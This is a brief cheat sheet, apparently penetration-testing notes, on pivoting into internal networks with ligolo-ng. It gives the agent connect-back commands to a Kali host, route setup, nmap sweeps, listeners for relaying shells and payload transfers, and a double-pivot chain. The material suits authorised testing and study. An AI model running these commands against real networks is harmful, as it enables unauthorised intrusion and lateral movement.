# Tunnelling
*   Setup
    *   Kali        → `ligstart()`
    *   Pivot     → `ligolo-agent -connect [KALI_IP]:11601 -ignore-cert`
    *   Kali        → Select Session → `start` 
    *   Kali        → Add Route        → `sudo ip route add [CIDR] dev ligolo`
*   Local Forwarding
    *   Route    → `240.0.0.1`
    *   Access   → `240.0.0.1:[PORT]` (Universal IP - Change Session to access other pivots)
*   Intranet Pivoting
    *   Route → `[INTRANET_CIDR]`
    *   Network Scanning
        *   `sudo nmap -PE -sn  [INTRANET_CIDR]`
        *   `sudo nmap -PE -sCV [INTRANET_IP]`
    *   Shells / Transfers
        *   Kali → `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:8000 --tcp` 
        *   Kali → `listen() 8000` / `httpserv() 8000`
        *   Requests/Payloads → `[PIVOT_INTRANET_IP]:30000`
    *   Double Pivoting
        *   Kali                   → Select Pivot Session + `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`
        *   Second Pivot → `ligolo-agent -connect [FIRST_PIVOT_INTRANET_IP]:11601 -ignore-cert`
        *   Kali                   → Select Session + `start` + `sudo ip route add [SECOND_INTRANET_CIDR] dev ligolo`